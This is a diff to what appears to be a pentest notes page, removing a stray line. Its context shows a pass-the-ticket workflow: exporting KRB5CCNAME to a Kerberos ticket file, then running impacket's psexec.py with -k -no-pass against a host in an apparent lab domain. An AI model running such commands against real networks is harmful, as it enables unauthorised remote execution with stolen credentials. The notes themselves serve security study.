@@ -31,7 +31,7 @@ Started service dd80980 on srv-1
 ### With impacket
 You need a .ccache or .kirbi ticket.
 To obtain those tickets from Rebeus: [[RubeusToCcache]]
-test
+
 ```
 export KRB5CCNAME=/root/impacket-examples/ticket.ccache
 python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
